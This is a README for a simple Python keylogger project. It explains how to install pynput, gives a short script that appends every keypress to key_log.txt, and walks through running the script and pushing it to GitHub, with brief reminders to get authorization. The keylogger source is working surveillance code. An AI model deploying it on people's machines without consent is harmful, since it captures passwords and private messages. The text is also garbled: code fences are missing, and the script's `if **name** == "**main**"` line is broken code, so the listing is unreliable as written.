# Simple Keylogger

## Description

This project is a simple keylogger program that records and logs keystrokes. The primary focus is on logging the keys pressed and saving them to a file. **Note**: Ethical considerations and permissions are crucial for projects involving keyloggers. Please ensure you have proper authorization before using this tool.

## Features

- Records keystrokes.
- Logs the keys pressed.
- Saves the logged keys to a file.
- Ensures ethical use with proper permissions.

## Technologies Used

- **Python**: The core programming language for the project.
- **pynput**: A Python library to control and monitor input devices.

## Setup and Installation

### Prerequisites

- **Python**: Download and install Python from [python.org](https://www.python.org/).

### Steps

1. **Clone the Repository**:

   ```bash
   git clone <repository-url>

2. Navigate to the Project Directory:

bash
cd simple_keylogger
Create a Virtual Environment (optional but recommended):

bash
python -m venv env
3. Activate the Virtual Environment:

On Windows:

bash
.\env\Scripts\activate
On macOS/Linux:

bash
source env/bin/activate
Install Required Packages:

bash
pip install pynput
How to Use
Run the Program:

bash
python keylogger.py
Logging Keystrokes:

The program will start recording keystrokes and log them to a file named key_log.txt.

Stopping the Keylogger:

To stop the keylogger, manually terminate the script by closing the terminal or using a keyboard interrupt (Ctrl + C).

Example
Here’s an example of what the logged keystrokes might look like in the key_log.txt file:

plaintext
Key.space
Key.shift_r
H
e
l
l
o
Key.space
W
o
r
l
d
!
Project Implementation Steps
Step 1: Set Up Your Project in VSCode
Open VSCode: Launch Visual Studio Code.

Open Your Project Folder: Go to File > Open Folder and select the folder you created for your project.

Step 2: Create the Python Script
Create a New Python File: In your project folder, create a new file named keylogger.py.

Step 3: Write the Python Code
Here’s a basic example of how to implement the keylogger using pynput:

python
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("key_log.txt", "a") as log_file:
        log_file.write(f"{key}\n")

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if **name** == "**main**":
    main()
Step 4: Run the Program
Open the Integrated Terminal: Go to View > Terminal in VSCode.

Navigate to Your Project Directory: If you’re not already in your project directory, use the cd command to navigate to it.

Run the Python Script: Execute the script by typing the following command in the terminal:

bash
python keylogger.py
Step 5: Ethical Considerations
Authorization: Ensure you have proper authorization and permissions before using the keylogger. It is crucial to respect privacy and legal guidelines.

Step 6: Version Control with Git & GitHub
Initialize Git: If you haven't already initialized a Git repository in your project directory, run:

bash
git init
Add Your Files: Add all your files to the staging area:

bash
git add .
Commit Your Changes: Commit the changes with a meaningful commit message:

bash
git commit -m "Initial commit with Simple Keylogger"
Link to GitHub Repository: Add the remote GitHub repository. Replace [your-repository-url] with the URL of the repository you created on GitHub:

bash
git remote add origin [your-repository-url]

Push to GitHub: Push your local changes to the GitHub repository:

bash
git push -u origin master
Learning Outcomes
